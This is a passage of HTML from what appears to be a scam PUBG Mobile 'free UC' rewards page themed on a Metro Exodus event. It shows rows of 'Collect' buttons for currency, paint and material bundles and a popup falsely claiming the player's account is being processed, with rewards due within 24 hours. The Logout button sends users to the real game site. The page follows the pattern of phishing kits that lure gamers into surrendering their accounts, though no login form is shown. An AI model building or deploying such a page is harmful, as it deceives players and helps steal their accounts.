<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/WgYyGnw/11.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pdYW33J/12.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/pdYW33J/12.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N9XVcKh/13.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/N9XVcKh/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/X8Y41sj/14.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/X8Y41sj/14.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mhWQMvq/15.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/mhWQMvq/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Rjh4zr4/16.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/Rjh4zr4/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qB0F8jV/17.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/qB0F8jV/17.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/n8pTPFf/18.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/n8pTPFf/18.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/rkkQqXM/20.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/rkkQqXM/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/jTsg4BQ/21.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/jTsg4BQ/21.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/v332bhy/4.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/v332bhy/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9sw3NZK/5.png">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/9sw3NZK/5.png">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab --->

<div id="other" class="gallery">
<div class="scroll">
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">1250 + 125</div>
<div class="balance-detail">Additional reward for Metro Exodus</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">2500 + 375</div>
<div class="balance-detail">Additional reward for Metro Exodus</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">5000 + 1000</div>
<div class="balance-detail">Additional reward for Metro Exodus</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/paint.png">
<div class="balance-nom">10</div>
<div class="balance-detail">Additional reward for Metro Exodus</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/paint.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/paint.png">
<div class="balance-nom">15</div>
<div class="balance-detail">Additional reward for Metro Exodus</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/paint.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/paint.png">
<div class="balance-nom">20</div>
<div class="balance-detail">Additional reward for Metro Exodus</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/paint.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/material.png">
<div class="balance-nom">10</div>
<div class="balance-detail">Additional reward for Metro Exodus</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/material.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/material.png">
<div class="balance-nom">15</div>
<div class="balance-detail">Additional reward for Metro Exodus</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/material.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/material.png">
<div class="balance-nom">20</div>
<div class="balance-detail">Additional reward for Metro Exodus</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/material.png">Collect</button>
</div>
</div> <!--- scroll --->
</div> <!--- tab --->
</div> <!--- box --->
</div> <!--- container --->

<div class="popup reward_confirmation">
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title">Processing Account</div></div>
<div class="popup-alert">
Thank your for joining this Metro Exodus event
<br>
<br>
Currently your account has been successfully processing
<br>
Please wait up to 24 hours to receive your rewards
<br>
<br>
</div>
<button type="button" class="popup-btn popup-btn-collect" onmousedown="buka.play()" onclick="location.href='https://pubgmobile.com/';"><span>Logout</span></button>
</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>